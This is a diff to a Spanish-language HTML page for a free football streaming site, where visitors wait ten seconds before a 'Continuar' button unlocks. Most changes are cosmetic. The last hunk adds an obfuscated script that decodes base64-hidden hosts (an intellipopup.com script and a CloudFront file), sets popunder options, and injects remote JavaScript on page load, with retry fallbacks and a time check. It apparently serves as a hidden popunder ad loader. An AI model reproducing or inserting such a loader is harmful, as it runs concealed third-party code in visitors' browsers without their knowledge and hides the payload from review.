@@ -105,9 +105,8 @@
         </h4>
 
         <!-- Imagen dentro del body -->
-        <div data-mndazid="348013ca-e854-409d-8ef0-272b80c51d87"></div>
         <img src="imagen.jpg" alt="Imagen de fútbol" class="imagen"> <!-- Reemplaza 'imagen.jpg' con la ruta de tu imagen -->
-           <div data-mndazid="f1973cfa-d8bd-4a9d-b166-7f11e30ea1dd"></div>
+
         <!-- Sección de Preguntas Frecuentes (FAQ) -->
         <div class="faq">
             <h3>¿Cuáles son los métodos de pago disponibles?</h3>
@@ -119,11 +118,11 @@
             <h3>¿Qué hago si tengo problemas técnicos durante una transmisión?</h3>
             <p>Si experimentas problemas técnicos, te recomendamos que primero verifiques tu conexión a Internet. Si el problema persiste, puedes contactar con nuestro soporte técnico a través del formulario en nuestra página de ayuda, y nuestro equipo estará encantado de asistirte.</p>
             
-            <h3>para ver los partidos esperen 10 segundos y toque el botón de Continuar y los llevara ala pagina donde podran ver los partidos de futbol</h3>
+            <h3>Para ver los partidos, espere 10 segundos y toque el botón de Continuar, y lo llevará a la página donde podrá ver los partidos de fútbol.</h3>
         </div>
 
         <!-- Botón de Continuar -->
-        <a id="continueButton" class="button disabled" href="https://futbollibre-hd.com/">
+        <a id="continueButton" class="button disabled" href="#">
             Por favor, espere
         </a>
         
@@ -161,5 +160,43 @@
             startTimer(tenSeconds, display, button);
         };
     </script>
+
+    <!-- Script adicional -->
+    <script type="text/javascript" data-cfasync="false">
+    (function(){
+        var b=window, c="e3f71afd0babcfcf1d34da3c6e195088", l=[
+            ["siteId",969-264*828-505-467+5352769],
+            ["minBid",0],
+            ["popundersPerIP","0"],
+            ["delayBetween",0],
+            ["default",false],
+            ["defaultPerDay",0],
+            ["topmostLayer","auto"]
+        ], g=["d3d3LmludGVsbGlwb3B1cC5jb20vT0ZCL3RvYm9lLWJyb3dzZXIubWluLmpz","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvYUh6VVJoL0l3WkdySi9zZmlsdGVyLm1pbi5jc3M="],
+        v=-1, u, j, t=function(){
+            clearTimeout(j);
+            v++;
+            if(g[v] && !(1752166446000<(new Date).getTime()&&1<v)){
+                u=b.document.createElement("script");
+                u.type="text/javascript"; u.async=!0;
+                var n=b.document.getElementsByTagName("script")[0];
+                u.src="https://"+atob(g[v]);
+                u.crossOrigin="anonymous";
+                u.onerror=t; u.onload=function(){
+                    clearTimeout(j);
+                    b[c.slice(0,16)+c.slice(0,16)] || t();
+                };
+                j=setTimeout(t,5E3);
+                n.parentNode.insertBefore(u,n);
+            }
+        };
+        if(!b[c]){
+            try{
+                Object.freeze(b[c]=l);
+            }catch(e){}
+            t();
+        }
+    })();
+    </script>
 </body>
-</html> en parte
+</html>
